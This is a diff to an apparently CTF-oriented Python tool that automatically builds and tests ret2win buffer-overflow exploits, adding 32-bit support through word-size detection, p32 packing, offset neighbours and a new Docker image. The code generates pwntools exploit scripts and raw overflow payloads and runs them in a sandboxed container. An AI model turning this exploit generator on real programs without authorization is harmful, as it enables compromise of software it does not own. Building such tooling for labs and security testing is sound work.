@@ -93,6 +93,18 @@ def find_win(binary: str) -> Optional[int]:
     return None
 
 
+def _word_size(binary: str) -> int:
+    """Tamano de puntero en bytes (4 o 8). Sin esto, un ret2win de 32 bits (ret2win32) se
+    empaquetaba con p64/8 bytes fijos: los 4 bytes de mas escriben sobre lo que siga en la
+    pila tras la direccion de retorno (un registro guardado, padding, otro frame) y el proceso
+    termina con SIGSEGV en vez de saltar a win() -- confirmado en sandbox con ret2win32."""
+    try:
+        info = json.loads(_r2(binary, "ij") or "{}").get("bin", {})
+        return 4 if info.get("bits") == 32 else 8
+    except Exception:
+        return 8
+
+
 def find_ret_gadget(binary: str) -> Optional[int]:
     out = _r2(binary, "/R ret")
     for line in out.splitlines():
@@ -142,7 +154,8 @@ def find_pc_offset(binary: str, maxlen: int = 400, budget_s: float = 20.0) -> Op
 
 
 def build_script(binary: str, offset: int, win: int, ret: Optional[int]) -> str:
-    align = f"    p64({hex(ret)}),  # ret gadget (stack alignment)\n" if ret else ""
+    pfn = "p32" if _word_size(binary) == 4 else "p64"
+    align = f"    {pfn}({hex(ret)}),  # ret gadget (stack alignment)\n" if ret else ""
     return f'''#!/usr/bin/env python3
 # binoracle auto-PoC (ret2win) for an AUTHORIZED target
 from pwn import *
@@ -150,7 +163,7 @@ context.binary = elf = ELF({binary!r})
 io = process(elf.path)
 payload = flat({{
     {offset}: [
-{align}        p64({hex(win)}),  # win()
+{align}        {pfn}({hex(win)}),  # win()
     ]
 }})
 io.sendline(payload)
@@ -175,10 +188,13 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
            f"{{ cat .poc_payload; sleep 0.5; printf '%s\\n' \"{shell_cmd}\"; sleep 0.3; }} "
            f"| stdbuf -oL -eL ./{name} 2>&1 | head -80")
     try:
+        # binoracle-pwn (no gcc:13): trae libc6:i386, necesaria para binarios de 32 bits como
+        # ret2win32 (gcc:13 no tiene multiarch instalado y qemu-i386 falla al no encontrar
+        # /lib/ld-linux.so.2). bash/stdbuf/chmod/head ya estan en esa imagen.
         out = subprocess.run(
             [docker, "run", "--rm", "--platform", "linux/amd64", "--network", "none",
              "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
-             "gcc:13", "bash", "-c", run],
+             "binoracle-pwn", "bash", "-c", run],
             capture_output=True, text=True, timeout=120)
         return (True, out.stdout + out.stderr)
     except subprocess.TimeoutExpired:
@@ -193,7 +209,8 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
 def _static_offset(binary: str) -> Optional[int]:
     """Offset a la direccion de retorno guardada para el caso clasico de buffer de pila, SIN
     ejecutar: la variable local (base rbp) mas profunda de la funcion que llama a un sink de
-    lectura, mas 8 (rbp guardado). Robusto donde la ejecucion simbolica de angr se equivoca."""
+    lectura, mas el tamano del rbp/ebp guardado (word size: 4 en x86, 8 en x86_64). Robusto
+    donde la ejecucion simbolica de angr se equivoca."""
     try:
         import r2pipe
         r = r2pipe.open(binary, flags=["-2"])
@@ -210,7 +227,7 @@ def _static_offset(binary: str) -> Optional[int]:
             for v in vs.get("bp", []):
                 off = (v.get("ref") or {}).get("offset")
                 if isinstance(off, int) and off < 0:
-                    cand = -off + 8
+                    cand = -off + _word_size(binary)
                     if best is None or cand > best:
                         best = cand
         r.quit()
@@ -221,17 +238,25 @@ def _static_offset(binary: str) -> Optional[int]:
 
 def _offset_candidates(binary: str, offset: Optional[int]) -> list:
     """Offsets a probar, en orden. Si el usuario da uno, solo ese. Si no, combina angr y el
-    metodo estatico (r2), descartando valores absurdos (<=0, el 0 bogus que a veces da angr)."""
+    metodo estatico (r2), descartando valores absurdos (<=0, el 0 bogus que a veces da angr).
+    Por cada candidato tambien se prueban sus vecinos a +/- word_size: el padding de alineacion
+    que el compilador mete antes del buffer (o entre el buffer y rbp/ebp guardado) puede
+    desplazar el offset real por exactamente eso, y tanto angr como el metodo estatico pueden
+    fallar por ese margen (confirmado en ret2win32: angr dio 80, el offset real era 76)."""
     if offset is not None:
         return [offset]
+    wsz = _word_size(binary)
     cands = []
     for fn in (find_pc_offset, _static_offset):
         try:
             o = fn(binary)
         except Exception:
             o = None
-        if isinstance(o, int) and o > 0 and o not in cands:
-            cands.append(o)
+        if not (isinstance(o, int) and o > 0):
+            continue
+        for cand in (o, o - wsz, o + wsz):
+            if cand > 0 and cand not in cands:
+                cands.append(cand)
     return cands
 
 
@@ -268,11 +293,12 @@ def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCR
         return r
 
     ret = find_ret_gadget(binary)
+    wsz = _word_size(binary)
     best: Optional[PoCResult] = None
     for off in cands:
         rr = PoCResult(ok=True, stage="built", win=win, offset=off)
         rr.script = build_script(binary, off, win, ret)
-        payload = b"A" * off + (ret.to_bytes(8, "little") if ret else b"") + win.to_bytes(8, "little")
+        payload = b"A" * off + (ret.to_bytes(wsz, "little") if ret else b"") + win.to_bytes(wsz, "little")
         rr.payload_hex = payload.hex()
         if run:
             ran, output = _docker_run(binary, payload)
@@ -319,10 +345,11 @@ def _docker_run_raw(binary: str, data: bytes):
     with open(os.path.join(d, ".poc_raw"), "wb") as f:
         f.write(data)
     try:
+        # binoracle-pwn: ver comentario en _docker_run() sobre soporte i386 para ret2win32.
         out = subprocess.run(
             [docker, "run", "--rm", "--platform", "linux/amd64", "--network", "none",
              "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
-             "gcc:13", "bash", "-c", f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_raw 2>&1 | head -60"],
+             "binoracle-pwn", "bash", "-c", f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_raw 2>&1 | head -60"],
             capture_output=True, text=True, timeout=120)
         return (True, out.stdout + out.stderr)
     except subprocess.TimeoutExpired:
